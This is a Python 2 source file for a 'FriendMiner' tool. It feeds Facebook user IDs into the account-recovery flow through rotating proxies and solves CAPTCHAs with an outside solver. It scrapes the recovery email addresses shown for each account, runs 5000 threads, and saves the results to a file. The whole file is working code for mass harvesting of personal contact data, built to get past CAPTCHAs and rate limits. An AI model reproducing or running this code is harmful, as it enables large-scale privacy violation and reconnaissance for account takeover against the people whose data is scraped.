'''
Created on Nov 24, 2014
@author: Etienne
'''

import requests, socket
from requests.exceptions import RequestException
from Queue import Queue
from threading import Thread



def parseCaptchaLink(data):
    data = data.split("https:\/\/www.facebook.com\/captcha\/")[1]
    data = data.split("\\\" alt=")[0]
    link = "https://www.facebook.com/captcha/"+data
    return link

def parseCaptchaData(data):
    data = data.split("id=\\\"captcha_persist_data\\\" name=\\\"captcha_persist_data\\\" value=\\\"")[1]
    data = data.split("\\\"")[0]
    return data

def parseRecoveryLink(link):
    link = link.split("initiate?ldata=")[1]
    link = link.split("\\\"")[0]
    return link
    
def parseMails(data):
    data = data.split("</strong><br /><div>")[1]
    data = data.split("</div></div></div></div></label></div></td></tr>")[0]
    mails = data.split("</div><div>")
    return mails
    
    
class FriendMiner:
    def __init__(self):
        self.mails = {}
    def mineFriend(self, ID, ProxyManager, CS):
        recoveryLink0 = "https://www.facebook.com/ajax/login/help/identify.php?ctx=recover&__a=1&email="
        s = requests.Session()
        ProxyManager.proxyUp(s)
        try: 
            recoveryLink1 = s.get(recoveryLink0+ID, timeout = 5).text
            if "Security Check" in recoveryLink1:
                captchaLink = parseCaptchaLink(recoveryLink1)
                captchaData = parseCaptchaData(recoveryLink1)
                solution = CS.solveCaptcha(ID, captchaLink)
                recoveryLink2 = recoveryLink0+ID + "&captcha_persist_data="+captchaData + "&captcha_response="+solution
            else:
                recoveryLink2 = recoveryLink1
            recoveryLink3 = s.get(recoveryLink2)
            finalLink = "http://www.facebook.com/recover/initiate?ldata="+parseRecoveryLink(recoveryLink3.text)
            result = s.get(finalLink)
            mails = parseMails(result.text)
            self.mails[ID] = mails  
        except RequestException, socket.error:
            pass
    def mineFriendsThread(self, friendQueue, ProxyManager, CaptchaSolver):
        while True:
            ID = friendQueue.get()
            self.mineFriend(ID, ProxyManager, CaptchaSolver)
            friendQueue.task_done()
    def mineFriends(self, friendList, ProxyManager, CaptchaSolver):
        friendQueue = self.startQueue(ProxyManager, CaptchaSolver)
        for ID in friendList:
            friendQueue.put(ID)
        friendQueue.join()
    def startQueue(self, ProxyManager, CaptchaSolver):
        friendQueue = Queue(5000)
        for i in xrange(5000):
            t = Thread(target=self.mineFriendsThread, args=[friendQueue, ProxyManager, CaptchaSolver])
            t.daemon = True
            t.start()
        return friendQueue
    def saveFriends(self):
        f = open("Users.txt","w")
        text = ""
        for ID in self.mails.keys():
            text += ID+":"
            for mail in self.mails[ID]:
                text += mail+","
            text += "\n"
        f.write(text)
        f.close()
